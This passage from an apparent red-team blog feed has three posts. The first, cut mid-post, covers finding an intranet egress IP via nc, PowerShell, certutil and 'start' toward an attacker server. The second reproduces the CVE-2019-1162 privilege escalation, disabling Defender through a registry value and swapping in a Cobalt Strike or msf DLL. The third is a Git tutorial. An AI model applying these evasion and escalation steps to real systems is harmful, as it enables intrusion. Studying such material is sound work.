class="string">"nc.exe"</span>)</span><br></pre></td></tr></table></figure></p><p>同样，只要是走http通道，那就肯定可以和我们的vps进行连接，就可以拿到出网ip了</p><p><img src="/如何寻找内网出口ip.resources/EB7707FA-E591-4520-9874-DE0D281F4FBF.png" alt="2c06dc63c41d0c1d698e9d1fb698bf22"></p><p><img src="/如何寻找内网出口ip.resources/8A3B4E42-2050-418E-A08A-E5E0A31C3FB4.png" alt="3be76eb775caa75eea974875b0fe5c59"></p><h3 id="WebRequest"><a href="#WebRequest" class="headerlink" title="WebRequest"></a>WebRequest</h3><p><code>Powershell version &gt; 3.0</code> 就可以使用Windows上的wget了2333</p><p>查看Powershell版本：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Host</span></span><br><span class="line"><span class="variable">$PSVersionTable</span>.PSVersion</span><br></pre></td></tr></table></figure></p><p>官方文档：<br><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1</a><br><img src="/如何寻找内网出口ip.resources/86CB25E8-75F4-4FFE-8FA4-85DE4BA4ED66.png" alt="c36f05c4f3fda64d50bdd311c14bf9c4"></p><p>Usage:<br><img src="/如何寻找内网出口ip.resources/1717FC59-8205-4E3F-A1E2-DD86447ECDCE.png" alt="a1dcebf74d84473ab952f25e9266cfb4"></p><p><img src="/如何寻找内网出口ip.resources/64EE7E2C-241F-4575-89F6-7A1BBC891B6F.png" alt="de63fcec3f88e9e2d2b2622791d1c748"></p><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p><code>certutil</code>这个东西被AV监控得太死了..<br><img src="/如何寻找内网出口ip.resources/933199E4-E637-48E8-AFA8-4212D731755B.png" alt="fdedf94858c856e6560d27dfcb634d6e"><br><img src="/如何寻找内网出口ip.resources/BE759B80-FA21-4F1B-88E9-5749FD816B2D.png" alt="cdbdb7eb2e69f14fa211e114b88dd701"></p><p>实战用的话也需要一定的绕过技巧</p><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>start命令直接会开启一个ie进程去访问目标url<br><img src="/如何寻找内网出口ip.resources/351FF26E-1CED-4A96-ACC9-CBB71041B898.png" alt="a7015efe5a0ceeddc7a78797d42d364a"></p><p><img src="/如何寻找内网出口ip.resources/53FA6E22-78DB-439F-B51D-121D8C76FB81.png" alt="65be4f74982d1bcdf0b6e0545a21bf96"></p><p>当然，需要注意用户，别给别人远程桌面开个ie啥的</p><h3 id="…"><a href="#…" class="headerlink" title="…"></a>…</h3><p>还有其他的姿势，反正我我觉得只要是可以用各种西诶咦访问外面的，都可以拿到真实的出口ip，大哥们也可以研究下</p><h2 id="0x03-反弹shell"><a href="#0x03-反弹shell" class="headerlink" title="0x03 反弹shell"></a>0x03 反弹shell</h2><p>既然有Webshell了，最常见的方式也就是反弹个shell啥的，这里就不多讲了，os shell,meterpreter啥的都ok</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个问题也是突发奇想，好像具体的意义也不是很大，主要是在想如何规避AV和不通过第三方应用和写文件的情况下进行一个ip获取～师傅们见谅</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-8-20 20:14:23&lt;br&gt;&lt;img src=&quot;/wallpaper/30597.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-1162 CTFtool 提权</title>
    <link href="http://patrilic.top/2019/08/17/CVE-2019-1162/"/>
    <id>http://patrilic.top/2019/08/17/CVE-2019-1162/</id>
    <published>2019-08-16T16:03:55.000Z</published>
    <updated>2019-08-20T15:29:22.659Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-17 0:03:55<br><img src="/wallpaper/[130511]鵜飼い-44873217.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a little-known protocol used on Windows to implement Text Services. This might be useful for studying Windows internals, debugging complex issues with Text Input Processors and analyzing Windows security.</span><br></pre></td></tr></table></figure><p>据说通杀xp到win10<br>来自GooleProjectZero的报告：<a href="https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html</a></p><h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>测试版本： <code>Windows 10 1809</code></p><p><img src="/CVE-2019-1162.resources/2AFEC235-3626-4446-B1B5-CE0462059B80.png" alt="449d401cf3dd9aef600033710ed498a2"><br><img src="/CVE-2019-1162.resources/748477CB-5ADC-4D7C-B654-F7BB96AFAC35.png" alt="c70fd3e19082ffeb3204669d1e3ec49d"></p><h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><p>传文件到虚拟机的时候，被Defender拦截了<br><img src="/CVE-2019-1162.resources/5891F28E-EA4E-4BD2-87C5-3CF0610CFA3F.png" alt="17620e7ea3a556734cca6cd2aeabea97"></p><p>由于只是复现一下，就直接关了就行..</p><blockquote><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService</p></blockquote><p>在右侧找到DWORD（32位）值，命名为Start。</p><p>修改数值数据为4</p><p><img src="/CVE-2019-1162.resources/9E06EBB1-BDE7-4FA4-BD18-B8D75C7E6FC0.png" alt="c9c92e378df7e718c39ec5558a31ffc8"><br><img src="/CVE-2019-1162.resources/4FD148D1-B1D5-48C1-A4D0-D5B544492CFF.png" alt="9d68611fbee4ad90a6c40168e986fd26"></p><p>同样可以直接修改dll为<code>cobalt Stike</code>或者<code>msf</code>生成的dll就可以回弹了，简单方便～<br>问题： </p><ol><li>测试win7和win10 1903都可以成功，但是有些环境提示缺少<code>MSVCPxx.dll</code>，需要依赖。</li><li>需要多次交互，建议改源码或者写一键脚本</li><li>特征太明显，需要免杀</li></ol><h2 id="0x03-视频"><a href="#0x03-视频" class="headerlink" title="0x03 视频"></a>0x03 视频</h2><p><a href="https://www.bilibili.com/video/av64061036/" target="_blank" rel="noopener">https://www.bilibili.com/video/av64061036/</a></p><p><iframe width="700" height="550" src="//player.bilibili.com/player.html?aid=64061036&cid=111231293&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe></p><h2 id="0x04-链接"><a href="#0x04-链接" class="headerlink" title="0x04 链接"></a>0x04 链接</h2><p><a href="https://github.com/taviso/ctftool" target="_blank" rel="noopener">https://github.com/taviso/ctftool</a><br><a href="https://www.youtube.com/watch?time_continue=2&amp;v=r3vrzzDpmhc" target="_blank" rel="noopener">https://www.youtube.com/watch?time_continue=2&amp;v=r3vrzzDpmhc</a><br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1162" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1162</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-17 0:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/[130511]鵜飼い-44873217.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Windows提权" scheme="http://patrilic.top/tags/Windows%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>从Learn Git Branching学习Git</title>
    <link href="http://patrilic.top/2019/08/15/%E4%BB%8ELearn%20Git%20Branching%E5%AD%A6%E4%B9%A0Git/"/>
    <id>http://patrilic.top/2019/08/15/从Learn Git Branching学习Git/</id>
    <published>2019-08-15T01:14:11.000Z</published>
    <updated>2019-08-20T15:30:47.442Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-15 09:14:11<br><img src="/wallpaper/62840874_p0.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学学学～，突然发现Git真的是神器。。可惜我以前只会<code>git clone</code>和<code>git pull</code>之类的..</p><p>然后这次打算利用<a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">Learn Git Branching</a>这个网站快速入门Git，做个记录</p><h2 id="0x01-基础篇"><a href="#0x01-基础篇" class="headerlink" title="0x01 基础篇"></a>0x01 基础篇</h2><h3 id="Git-Commit"><a href="#Git-Commit" class="headerlink" title="Git Commit"></a>Git Commit</h3><p>Git 仓库中的提交记录保存的是你的目录下所有文件的快照，就像是把整个目录复制，然后再粘贴一样，但比复制粘贴优雅许多！</p><p>Git 希望提交记录尽可能地轻量，因此在你每次进行提交时，它并不会盲目地复制整个目录。条件允许的情况下，它会将当前版本与仓库中的上一个版本进行对比，并把所有的差异打包到一起作为一个提交记录。</p><p>Git 还保存了提交的历史记录。这也是为什么大多数提交记录的上面都有父节点的原因 —— 我们会在图示中用箭头来表示这种关系。对于项目组的成员来说，维护提交历史对大家都有好处</p><p><code>使用Git commit会将当前节点变成父节点，然后在此基础上生成子节点</code></p><h3 id="Git-branch"><a href="#Git-branch" class="headerlink" title="Git branch"></a>Git branch</h3><p>Git 的分支也非常轻量。它们只是简单地指向某个提交纪录 —— 仅此而已。所以许多 Git 爱好者传颂：</p><p>早建分支！多用分支！</p><p>这是因为即使创建再多分的支也不会造成储存或内存上的开销，并且按逻辑分解工作到不同的分支要比维护那些特别臃肿的分支简单多了。</p><p>在将分支和提交记录结合起来后，我们会看到两者如何协作。现在只要记住使用分支其实就相当于在说：“我想基于这个提交以及它所有的父提交进行新的工作。”</p><p>使用<code>git checkout &lt;name&gt;</code>来切换分支</p><p>如果你想创建一个新的分支同时切换到新创建的分支的话，可以通过 <code>git checkout -b &lt;your-branch-name&gt;</code>来实现。</p><h3 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h3><p>在 Git 中合并两个分支时会产生一个特殊的提交记录，它有两个父节点。翻译成自然语言相当于：“我要把这两个父节点本身及它们所有的祖先都包含进来。”</p><p><img src="/从Learn Git Branching学习Git.resources/2614D1E0-BD73-48F8-B8DB-5F6CEC905F80.png" alt="192ba280fae5ee0fd1f909cff39ead77"></p><p><img src="/从Learn Git Branching学习Git.resources/F58D8E70-4B17-41AA-8742-FD472E1BF94A.png" alt="b26c0aefbbee442bf750ce2f01eae6de"></p><h3 id="Git-Rebase"><a href="#Git-Rebase" class="headerlink" title="Git Rebase"></a>Git Rebase</h3><p>Rebase 实际上就是取出一系列的提交记录，“复制”它们，然后在另外一个地方逐个的放下去。</p><p>Rebase 的优势就是可以创造更线性的提交历史，这听上去有些难以理解。如果只允许使用 Rebase 的话，代码库的提交历史将会变得异常清晰。</p><p><img src="/从Learn Git Branching学习Git.resources/50EA88DF-1C3E-41D1-9840-4E7A01090760.png" alt="18515be24c4a725919c1b94c7a72f606"></p><h2 id="0x02-高级篇"><a href="#0x02-高级篇" class="headerlink" title="0x02 高级篇"></a>0x02 高级篇</h2><h3 id="分离HEAD"><a href="#分离HEAD" class="headerlink" title="分离HEAD"></a>分离HEAD</h3><p>我们首先看一下 “HEAD”。 HEAD 是一个对当前检出记录的符号引用 —— 也就是指向你正在其基础上进行工作的提交记录。</p><p>HEAD 总是指向当前分支上最近一次提交记录。大多数修改提交树的 Git 命令都是从改变 HEAD 的指向开始的。</p><p>HEAD 通常情况下是指向分支名的（如 bugFix）。在你提交时，改变了 bugFix 的状态，这一变化通过 HEAD 变得可见。</p><p><img src="/从Learn Git Branching学习Git.resources/9069213E-F9CD-4FC8-9E74-0B8F0B75A0AA.png" alt="fd0e97c8eaad7c0bb5a6c7c278765c8e"></p><h3 id="相对引用"><a href="#相对引用" class="headerlink" title="相对引用"></a>相对引用</h3><p>通过指定提交记录哈希值的方式在 Git 中移动不太方便。在实际应用时，并没有像本程序中这么漂亮的可视化提交树供你参考，所以你就不得不用 git log 来查查看提交记录的哈希值。</p><p>并且哈希值在真实的 Git 世界中也会更长（译者注：基于 SHA-1，共 40 位）。例如前一关的介绍中的提交记录的哈希值可能是 fed2da64c0efc5293610bdd892f82a58e8cbc5d8。舌头都快打结了吧…</p><p>比较令人欣慰的是，Git 对哈希的处理很智能。你只需要提供能够唯一标识提交记录的前几个字符即可。因此我可以仅输入fed2 而不是上面的一长串字符。</p><p><img src="/从Learn Git Branching学习Git.resources/8F832134-D7A6-46C5-9C19-B2F4E27DE7E1.png" alt="82ea783ee879c7e317d6c81361dead95"></p><p>“~”操作符<br>如果你想在提交树中向上移动很多步的话，敲那么多 ^ 貌似也挺烦人的，Git 当然也考虑到了这一点，于是又引入了操作符 ~。</p><p>该操作符后面可以跟一个数字（可选，不跟数字时与 ^ 相同，向上移动一次），指定向上移动多少次。咱们还是通过实际操作看一下吧</p><p><strong>强制修改分支位置</strong><br>你现在是相对引用的专家了，现在用它来做点实际事情。</p><p>我使用相对引用最多的就是移动分支。可以直接使用 -f 选项让分支指向另一个提交。例如:</p><p>git branch -f master HEAD~3</p><p>上面的命令会将 master 分支强制指向 HEAD 的第 3 级父提交。<br><img src="/从Learn Git Branching学习Git.resources/4509FB0F-B67C-4FF9-BE10-99E53FD8D771.png" alt="f447b9a4564b33261cea73e6216e7c4f"></p><p>这关的练习挺有意思的ahhh</p><h3 id="撤销变更"><a href="#撤销变更" class="headerlink" title="撤销变更"></a>撤销变更</h3><p>在 Git 里撤销变更的方法很多。和提交一样，撤销变更由底层部分（暂存区的独立文件或者片段）和上层部分（变更到底是通过哪种方式被撤销的）组成。我们这个应用主要关注的是后者。</p><p>主要有两种方法用来撤销变更 —— 一是 git reset，还有就是 git revert。接下来咱们逐个进行讲解。<br><img src="/从Learn Git Branching学习Git.resources/77F0A047-20D3-4C7D-9717-A3B7FAB89413.png" alt="d99d76d8f5424fcd99266252dd643b2f"></p><p><img src="/从Learn Git Branching学习Git.resources/E58FC9EC-1CE9-4CA9-9659-BB89197E199D.png" alt="bb4a48b09f3d4801500a97b02668e17d"></p><h2 id="0x03-移动提交记录"><a href="#0x03-移动提交记录" class="headerlink" title="0x03 移动提交记录"></a>0x03 移动提交记录</h2><h3 id="Git-Cherry-pick"><a href="#Git-Cherry-pick" class="headerlink" title="Git Cherry-pick"></a>Git Cherry-pick</h3><p>本系列的第一个命令是 git cherry-pick, 命令形式为:</p><p>git cherry-pick &lt;提交号&gt;…<br>如果你想将一些提交复制到当前所在的位置（HEAD）下面的话， Cherry-pick 是最直接的方式了。我个人非常喜欢 cherry-pick，因为它特别简单。</p><p><img src="/从Learn Git Branching学习Git.resources/3359DD9A-B71C-469C-9D30-045C734CCA6E.png" alt="765027cb3d5707374b46492489d40950"></p><h3 id="交互式的-rebase"><a href="#交互式的-rebase" class="headerlink" title="交互式的 rebase"></a>交互式的 rebase</h3><p>当你知道你所需要的提交记录（并且还知道这些提交记录的哈希值）时, 用 cherry-pick 再好不过了 —— 没有比这更简单的方式了。</p><p>但是如果你不清楚你想要的提交记录的哈希值呢? 幸好 Git 帮你想到了这一点, 我们可以利用交互式的 rebase —— 如果你想从一系列的提交记录中找到想要的记录, 这就是最好的方法了</p><p>交互式 rebase 指的是使用带参数 –interactive 的 rebase 命令, 简写为 -i</p><p>如果你在命令后增加了这个选项, Git 会打开一个 UI 界面并列出将要被复制到目标分支的备选提交记录，它还会显示每个提交记录的哈希值和提交说明，提交说明有助于你理解这个提交进行了哪些更改。</p><p>在实际使用时，所谓的 UI 窗口一般会在文本编辑器 —— 如 Vim —— 中打开一个文件。 考虑到课程的初衷，我弄了一个对话框来模拟这些操作。</p><p>当 rebase UI界面打开时, 你能做3件事:</p><p>调整提交记录的顺序（通过鼠标拖放来完成）<br>删除你不想要的提交（通过切换 pick 的状态来完成，关闭就意味着你不想要这个提交记录）<br>合并提交。 遗憾的是由于某种逻辑的原因，我们的课程不支持此功能，因此我不会详细介绍这个操作。简而言之，它允许你把多个提交记录合并成一个。</p><p><img src="/从Learn Git Branching学习Git.resources/34362025-526B-46E4-BE18-2AA3F840D1DA.png" alt="e36004deb440e13f039d11d45f914336"></p><h2 id="0x04-杂项"><a href="#0x04-杂项" class="headerlink" title="0x04 杂项"></a>0x04 杂项</h2><h3 id="本地栈式提交"><a href="#本地栈式提交" class="headerlink" title="本地栈式提交"></a>本地栈式提交</h3><p>看一个在开发中经常会遇到的情况：我正在解决某个特别棘手的 Bug，为了便于调试而在代码中添加了一些调试命令并向控制台打印了一些信息。</p><p>这些调试和打印语句都在它们各自的提交记录里。最后我终于找到了造成这个 Bug 的根本原因，解决掉以后觉得沾沾自喜！</p><p>最后就差把 bugFix 分支里的工作合并回 master 分支了。你可以选择通过 fast-forward 快速合并到 master 分支上，但这样的话 master 分支就会包含我这些调试语句了。你肯定不想这样，应该还有更好的方式……</p><p>实际我们只要让 Git 复制解决问题的那一个提交记录就可以了。跟之前我们在“整理提交记录”中学到的一样，我们可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i</span><br><span class="line">git cherry-pick</span><br></pre></td></tr></table></figure><p>来达到目的。</p><h3 id="提交的技巧-1"><a href="#提交的技巧-1" class="headerlink" title="提交的技巧 #1"></a>提交的技巧 #1</h3><p>接下来这种情况也是很常见的：你之前在 newImage 分支上进行了一次提交，然后又基于它创建了 caption 分支，然后又提交了一次。</p><p>此时你想对的某个以前的提交记录进行一些小小的调整。比如设计师想修改一下 newImage 中图片的分辨率，尽管那个提交记录并不是最新的了。</p><p>我们可以通过下面的方法来克服困难：</p><ul><li>先用 git rebase -i 将提交重新排序，然后把我们想要修改的提交记录挪到最前</li><li>然后用 commit –amend 来进行一些小修改</li><li>接着再用 git rebase -i 来将他们调回原来的顺序</li><li>最后我们把 master 移到修改的最前端（用你自己喜欢的方法），就大功告成啦！</li></ul><p>当然完成这个任务的方法不止上面提到的一种（我知道你在看 cherry-pick 啦），之后我们会多点关注这些技巧啦，但现在暂时只专注上面这种方法。 最后有必要说明一下目标状态中的那几个<code>&#39;</code> —— 我们把这个提交移动了两次，每移动一次会产生一个 <code>&#39;</code>；而 C2 上多出来的那个是我们在使用了 amend 参数提交时产生的，所以最终结果就是这样了。</p><p>也就是说，我在对比结果的时候只会对比提交树的结构，对于 <code>&#39;</code> 的数量上的不同，并不纳入对比范围内。只要你的 master 分支结构与目标结构相同，我就算你通过。</p><h3 id="提交的技巧-2"><a href="#提交的技巧-2" class="headerlink" title="提交的技巧 #2"></a>提交的技巧 #2</h3><p><img src="/从Learn Git Branching学习Git.resources/9E5623EC-E5BF-4769-BF07-C5CDE2AA2E85.png" alt="3989b7b8ec9346ac016e0b0359f9b2ed"></p><p>使用cherry-pick而不是rebase</p><h3 id="Git-Tags"><a href="#Git-Tags" class="headerlink" title="Git Tags"></a>Git Tags</h3><p>相信通过前面课程的学习你已经发现了：分支很容易被人为移动，并且当有新的提交时，它也会移动。分支很容易被改变，大部分分支还只是临时的，并且还一直在变。</p><p>你可能会问了：有没有什么可以永远指向某个提交记录的标识呢，比如软件发布新的大版本，或者是修正一些重要的 Bug 或是增加了某些新特性，有没有比分支更好的可以永远指向这些提交的方法呢？</p><p>当然有了！Git 的 tag 就是干这个用的啊，它们可以（在某种程度上 —— 因为标签可以被删除后重新在另外一个位置创建同名的标签）永久地将某个特定的提交命名为里程碑，然后就可以像分支一样引用了。</p><p>更难得的是，它们并不会随着新的提交而移动。你也不能检出到某个标签上面进行修改提交，它就像是提交树上的一个锚点，标识了某个特定的位置。</p><p>咱们来看看标签到底是什么样。<br><img src="/从Learn Git Branching学习Git.resources/09E6A8B9-6BF9-4C0C-8285-CD2EA66D021A.png" alt="eda9f37cda3db0a78b41231c2c106bb9"></p><h3 id="Git-Describe"><a href="#Git-Describe" class="headerlink" title="Git Describe"></a>Git Describe</h3><p>由于标签在代码库中起着“锚点”的作用，Git 还为此专门设计了一个命令用来描述离你最近的锚点（也就是标签），它就是 <code>git describe</code>！</p><p><code>Git Describe</code> 能帮你在提交历史中移动了多次以后找到方向；当你用 <code>git bisect</code>（一个查找产生 Bug 的提交记录的指令）找到某个提交记录时，或者是当你坐在你那刚刚度假回来的同事的电脑前时， 可能会用到这个命令。</p><p><img src="/从Learn Git Branching学习Git.resources/A9CEE6D3-F067-4268-BF36-8AA2776538E0.png" alt="699894efdfa9040cca48ef0c1cfebc34"><br><img src="/从Learn Git Branching学习Git.resources/FDF8C289-B2B6-4D18-BABE-AF2B8F6BA68F.png" alt="c477de5a3f6e9599613d42c8625ab11d"></p><h2 id="0x05-Remote"><a href="#0x05-Remote" class="headerlink" title="0x05 Remote"></a>0x05 Remote</h2><h3 id="Git-clone"><a href="#Git-clone" class="headerlink" title="Git clone"></a>Git clone</h3><p><img src="/从Learn Git Branching学习Git.resources/BD9DC00A-8D6E-4F17-89DB-29FEB666B559.png" alt="a95080721b1c67d1f457af6e19d8cbc0"></p><h3 id="Git-Fetch"><a href="#Git-Fetch" class="headerlink" title="Git Fetch"></a>Git Fetch</h3><p>Git 远程仓库相当的操作实际可以归纳为两点：向远程仓库传输数据以及从远程仓库获取数据。既然我们能与远程仓库同步，那么就可以分享任何能被 Git 管理的更新（因此可以分享代码、文件、想法、情书等等）。</p><p>本节课我们将学习如何从远程仓库获取数据 —— 命令如其名，它就是 git fetch。</p><p><img src="/从Learn Git Branching学习Git.resources/C9D0C011-8C0B-4BEF-9F82-173097CE43F9.png" alt="dc0218d0303c3fafc7f46aca13bc1b59"></p><p><img src="/从Learn Git Branching学习Git.resources/95A0815E-7386-4191-9F31-C9B7C4601103.png" alt="14572931af2dccd8b90678de59bc82ca"><br><img src="/从Learn Git Branching学习Git.resources/9FB29388-3E83-4488-81CE-5A428D58D98E.png" alt="2c3550421c09404c240c3f1e7431d304"></p><h3 id="Git-Pull"><a href="#Git-Pull" class="headerlink" title="Git Pull"></a>Git Pull</h3><p><img src="/从Learn Git Branching学习Git.resources/7006473F-F4A1-4A7C-82D7-915364267EF3.png" alt="7e289552cb9d3b6c9c52f44cddd22047"><br><img src="/从Learn Git Branching学习Git.resources/7333D970-4EC4-4036-B55D-BC29FBEA1B33.png" alt="b1ae8cf7f9ef2b9ffbe63519d581aa32"></p><h3 id="Git-fakeTeamwork-master"><a href="#Git-fakeTeamwork-master" class="headerlink" title="Git fakeTeamwork master"></a>Git fakeTeamwork master</h3><p><img src="/从Learn Git Branching学习Git.resources/CA3453C6-DEB1-411C-88E6-D4A558EE9879.png" alt="9b5af660f46f29bfa88c95ae8fafa636"></p><h3 id="Git-Push"><a href="#Git-Push" class="headerlink" title="Git Push"></a>Git Push</h3><p><img src="/从Learn Git Branching学习Git.resources/38A2069A-AB6C-4987-976C-70DA91D8E743.png" alt="1673f41c5be4bba1f7d6ba007b77d2e6"><br><img src="/从Learn Git Branching学习Git.resources/F2BB9EC5-FC8D-4E8B-818F-DE6F0B07060A.png" alt="fb6426cdc6b2a55e9de9852d70c9aaea"></p><h3 id="历史分支（实用）"><a href="#历史分支（实用）" class="headerlink" title="历史分支（实用）"></a>历史分支（实用）</h3><p><img src="/从Learn Git Branching学习Git.resources/C81FACE7-86DC-4F61-8E6B-6797BE791417.png" alt="90a13578ffbb27b78c5996af4fd73fe3"></p><p><img src="/从Learn Git Branching学习Git.resources/C1FD79C4-AF85-4342-B5EF-4687F4369A93.png" alt="25d1261efbb01df45777b0947fc48305"><br><img src="/从Learn Git Branching学习Git.resources/A51EC4C5-2E34-4320-9CBD-F68B7620C464.png" alt="53bb1152ea2586767d47fe0a1e702a84"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">git branch 查看本地所有分支</span><br><span class="line"></span><br><span class="line">git status 查看当前状态</span><br><span class="line"></span><br><span class="line">git commit 提交</span><br><span class="line"></span><br><span class="line">git branch -a 查看所有的分支</span><br><span class="line"></span><br><span class="line">git branch -r 查看远程所有分支</span><br><span class="line"></span><br><span class="line">git commit -am &quot;init&quot; 提交并且加注释</span><br><span class="line"></span><br><span class="line">git remote add origin git@192.168.1.119:ndshow</span><br><span class="line"></span><br><span class="line">git push origin master 将文件给推到服务器上</span><br><span class="line"></span><br><span class="line">git remote show origin 显示远程库origin里的资源</span><br><span class="line"></span><br><span class="line">git push origin master:develop</span><br><span class="line"></span><br><span class="line">git push origin master:hb-dev 将本地库与服务器上的库进行关联</span><br><span class="line"></span><br><span class="line">git checkout --track origin/dev 切换到远程dev分支</span><br><span class="line"></span><br><span class="line">git branch -D master develop 删除本地库develop</span><br><span class="line"></span><br><span class="line">git checkout -b dev 建立一个新的本地分支dev</span><br><span class="line"></span><br><span class="line">git merge origin/dev 将分支dev与当前分支进行合并</span><br><span class="line"></span><br><span class="line">git checkout dev 切换到本地dev分支</span><br><span class="line"></span><br><span class="line">git remote show 查看远程库</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line">git rm 文件名(包括路径) 从git中删除指定文件</span><br><span class="line"></span><br><span class="line">git clone git://github.com/schacon/grit.git 从服务器上将代码给拉下来</span><br><span class="line"></span><br><span class="line">git config --list 看所有用户</span><br><span class="line"></span><br><span class="line">git ls-files 看已经被提交的</span><br><span class="line"></span><br><span class="line">git rm [file name] 删除一个文件</span><br><span class="line"></span><br><span class="line">git commit -a 提交当前repos的所有的改变</span><br><span class="line"></span><br><span class="line">git add [file name] 添加一个文件到git index</span><br><span class="line"></span><br><span class="line">git commit -v 当你用－v参数的时候可以看commit的差异</span><br><span class="line"></span><br><span class="line">git commit -m &quot;This is the message describing the commit&quot; 添加commit信息</span><br><span class="line"></span><br><span class="line">git commit -a -a是代表add，把所有的change加到git index里然后再commit</span><br><span class="line"></span><br><span class="line">git commit -a -v 一般提交命令</span><br><span class="line"></span><br><span class="line">git log 